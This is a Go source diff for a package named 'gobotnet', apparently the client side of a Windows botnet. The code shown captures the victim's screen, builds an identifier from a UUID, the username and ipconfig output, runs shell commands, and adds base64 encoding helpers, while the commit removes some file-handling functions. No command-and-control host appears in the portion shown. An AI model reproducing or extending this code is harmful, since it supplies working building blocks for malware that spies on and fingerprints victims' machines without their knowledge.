@@ -1,18 +1,18 @@
 package gobotnet
 
 import (
-	//"encoding/base64"
 	"bytes"
-	"errors"
+	"encoding/base64"
+	//"errors"
 	"fmt"
 	"github.com/satori/go.uuid"
 	"github.com/vova616/screenshot"
 	"golang.org/x/sys/windows/registry"
 	"image"
 	"image/png"
-	"io"
-	"io/ioutil"
-	"os"
+	//"io"
+	//"io/ioutil"
+	//"os"
 	"os/user"
 )
 
@@ -21,20 +21,20 @@ var (
 )
 
 func CmdTest() {
-	fmt.Println("test prgCmd")
-	// fmt.Println(getName())
-	//fmt.Println(getOS())
-	// fmt.Println(getUid())
-	// fmt.Println(getUsername())
-	// fmt.Println(getHomeDir())
-	//fmt.Println(base64.StdEncoding.EncodeToString([]byte(getIdentificator())))
-	image := GetScreenshot()
-	bytes, _ := ImageToBytes(image)
-	fmt.Println(bytes)
-	//SaveImageToFile(image, "1.png")
+	fmt.Println("CMD_EXEC.GO TEST")
+	// fmt.Println(GetName())
+	// fmt.Println(GetOS())
+	// fmt.Println(GetUid())
+	// fmt.Println(GetUsername())
+	// fmt.Println(GetHomeDir())
+	// fmt.Println(GetIdentificator())
+
+	// //image := GetScreenshot()
+	//bytes, _ := ImageToBytes(image)
+	//fmt.Println(bytes)
 }
 
-func getIdentificator() string {
+func GetIdentificator() string {
 	ipConfigOut, _ := CmdExec("ipconfig")
 	return id.String() + GetUsername() + string(ipConfigOut)
 }
@@ -79,36 +79,6 @@ func GetScreenshot() *image.RGBA {
 	return img
 }
 
-// func CheckFileExists(nameFile string) error {
-// 	fileInfo, err := os.Stat(nameFile)
-// 	if err != nil {
-// 		if os.IsNotExist(err) {
-// 			errors.New("File not exist.")
-// 		}
-// 		return err
-// 	}
-// 	return nil
-// }
-
-func ReadFile(nameFile string) (bytesFile []byte, err error) {
-	return ioutil.ReadFile(nameFile)
-}
-
-func SaveImageToFile(image *image.RGBA, nameFile string) error {
-	f, err := os.Create("./" + nameFile)
-	if err != nil {
-		OutMessage(err.Error())
-		return err
-	}
-	err = png.Encode(f, image)
-	if err != nil {
-		OutMessage(err.Error())
-		return err
-	}
-	f.Close()
-	return nil
-}
-
 func ImageToBytes(image *image.RGBA) ([]byte, error) {
 	buf := new(bytes.Buffer)
 	err := png.Encode(buf, image)
@@ -116,50 +86,10 @@ func ImageToBytes(image *image.RGBA) ([]byte, error) {
 	return imageBytes, err
 }
 
-func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
-	sourceFile, err := os.Open(pathSourceFile)
-	if err != nil {
-		return err
-	}
-	defer sourceFile.Close()
-
-	destFile, err := os.Create(pathDestFile)
-	if err != nil {
-		return err
-	}
-	defer destFile.Close()
-
-	_, err = io.Copy(destFile, sourceFile)
-	if err != nil {
-		return err
-	}
-
-	err = destFile.Sync()
-	if err != nil {
-		return err
-	}
-
-	sourceFileInfo, err := sourceFile.Stat()
-	if err != nil {
-		return err
-	}
-
-	destFileInfo, err := destFile.Stat()
-	if err != nil {
-		return err
-	}
-
-	if sourceFileInfo.Size() == destFileInfo.Size() {
-	} else {
-		return errors.New("Bad copy file")
-	}
-	return nil
+func ToBase64(bytes []byte) string {
+	return base64.StdEncoding.EncodeToString(bytes)
 }
 
-func DeleteFile(nameFile string) error {
-	err := os.Remove(nameFile)
-	if err != nil {
-		OutMessage(err.Error())
-	}
-	return err
+func FromBase64(str string) ([]byte, error) {
+	return base64.StdEncoding.DecodeString(str)
 }
